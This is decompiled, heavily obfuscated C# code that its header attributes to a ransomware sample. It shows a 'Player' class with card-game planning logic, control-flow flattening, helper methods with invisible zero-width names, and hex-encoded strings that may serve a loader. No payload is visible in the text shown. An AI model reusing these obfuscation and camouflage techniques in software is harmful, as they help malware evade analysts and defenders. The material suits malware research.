// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: CMSCOMSERVERFL, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: BC3392BE-E240-40FB-9209-64A3FA8E63B6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-1e3d099137ab4d4c152e6605801b6a5ead9837cb142dca1f5e596b75181cb673.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -1457545005;
      string str1;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1365164212)) % 13U)
        {
          case 0:
            num1 = (int) num2 * -146071341 ^ -1378593039;
            continue;
          case 1:
            str2 = str1;
            num1 = -1397579716;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -774100688 ^ 1356159543;
            continue;
          case 4:
            int num3;
            num1 = num3 = BaseStream != 1 ? -93160031 : (num3 = -2012303127);
            continue;
          case 5:
            num1 = (int) num2 * -1996483402 ^ -1006002587;
            continue;
          case 6:
            num1 = (int) num2 * 646539111 ^ 776623839;
            continue;
          case 7:
            str1 = "586D6C546F4669656C64547970654D";
            num1 = (int) num2 * 1383596945 ^ -1816096018;
            continue;
          case 8:
            num1 = (int) num2 * 2080301493 ^ -28704112;
            continue;
          case 9:
            str1 = (string) null;
            flag = BaseStream == 0;
            num1 = (int) num2 * -724677626 ^ 189758198;
            continue;
          case 10:
            str1 = "714737";
            num1 = (int) num2 * -1507881575 ^ -460006445;
            continue;
          case 11:
            int num4 = flag ? 26441357 : (num4 = 59690987);
            num1 = num4 ^ (int) num2 * 1058828824;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = -2134055968;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ -895586019)) % 4U)
        {
          case 0:
            num4 = 0;
            break;
          case 1:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * -1858760819 ^ 503757816;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 3:
            goto label_1;
          default:
            goto label_8;
        }
        num2 = num4;
        num1 = -1036896917;
      }
label_8:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = -1590156342;
        int num3;
        bool flag;
        int index;
        int[] planningCards;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ -964134210)) % 13U)
          {
            case 1:
              planningCards = this.PlanningCards;
              num2 = (int) num4 * 559442228 ^ -233474950;
              continue;
            case 2:
              flag = num3 > 0;
              num2 = (int) num4 * -1394606886 ^ -1193323738;
              continue;
            case 3:
              index = 0;
              num2 = (int) num4 * 1446803644 ^ 1747064254;
              continue;
            case 4:
              planningCardsCount = num1;
              num2 = (int) num4 * 76095734 ^ 268190953;
              continue;
            case 5:
              int num5;
              num2 = num5 = index < planningCards.Length ? -718008012 : (num5 = -1623571324);
              continue;
            case 6:
              num2 = -1289247359;
              continue;
            case 7:
              num3 = planningCards[index];
              num2 = -1479420443;
              continue;
            case 8:
              ++index;
              num2 = (int) num4 * 714378745 ^ 2059819849;
              continue;
            case 9:
              ++num1;
              num2 = (int) num4 * 350701069 ^ -2014494304;
              continue;
            case 10:
              int num6 = !flag ? 1688580779 : (num6 = 1363744185);
              num2 = num6 ^ (int) num4 * -778091564;
              continue;
            case 11:
              num2 = (int) num4 * 1554989235 ^ 2144106243;
              continue;
            case 12:
              goto label_1;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
label_1:
      int num1 = -2120861359;
      int index;
      int planningCard;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -274575209)) % 12U)
        {
          case 0:
            goto label_1;
          case 1:
            int num3 = planningCard == 0 ? -1063298803 : (num3 = -1229185391);
            num1 = num3 ^ (int) num2 * 1173676290;
            continue;
          case 2:
            str2 = str1;
            num1 = (int) num2 * -89766934 ^ 226522412;
            continue;
          case 3:
            int num4;
            num1 = num4 = index >= this.PlanningCards.Length ? -1054995251 : (num4 = -470601768);
            continue;
          case 4:
            num1 = (int) num2 * -1362613414 ^ -88694655;
            continue;
          case 5:
            num1 = (int) num2 * 2001774782 ^ -1650480945;
            continue;
          case 6:
            str1 = " ";
            index = 0;
            num1 = (int) num2 * 1656716359 ^ 197063846;
            continue;
          case 8:
            str1 = Player.\u200C‪‬⁯‪‫‫‏‬⁯⁯⁭‮‎‪‭⁫⁮‎‪‍‫⁬‏‮‫‎‭⁫‎⁮‎⁮⁫‬‭‫⁪‌⁫‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -226491074;
            continue;
          case 9:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * -1159184841 ^ 2124096977;
            continue;
          case 10:
            ++index;
            num1 = -1581135540;
            continue;
          case 11:
            num1 = -1230913502;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = 510499275;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1816720997)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 1678528184 ^ -499846658;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
      int[] numArray = new int[count];
label_1:
      int num1 = -2017982966;
      int aIndex;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1888611694)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            int num3;
            num1 = num3 = aIndex >= count ? -745649542 : (num3 = -1073155584);
            continue;
          case 2:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -892843455;
            continue;
          case 3:
            aIndex = 0;
            num1 = (int) num2 * -1958432596 ^ -1143397975;
            continue;
          case 4:
            planningCards = numArray;
            num1 = (int) num2 * 1946345504 ^ 1706358450;
            continue;
          case 5:
            ++aIndex;
            num1 = (int) num2 * -1690680914 ^ -773028381;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1485906012;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1128741325)) % 4U)
        {
          case 1:
            str = Player.\u200F‬‮‎⁬​⁪‭‮‪‭⁭⁬‌‫‭⁫‫‍‌‭⁫⁭‬⁫‍⁭⁬​⁮‭‍⁫⁯⁭⁪‎⁯‏‌‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 362571239 ^ 716962548;
            continue;
          case 2:
            num1 = (int) num2 * -1441196964 ^ 771360073;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u200C‪‬⁯‪‫‫‏‬⁯⁯⁭‮‎‪‭⁫⁮‎‪‍‫⁬‏‮‫‎‭⁫‎⁮‎⁮⁫‬‭‫⁪‌⁫‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200F‬‮‎⁬​⁪‭‮‪‭⁭⁬‌‫‭⁫‫‍‌‭⁫⁭‬⁫‍⁭⁬​⁮‭‍⁫⁯⁭⁪‎⁯‏‌‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
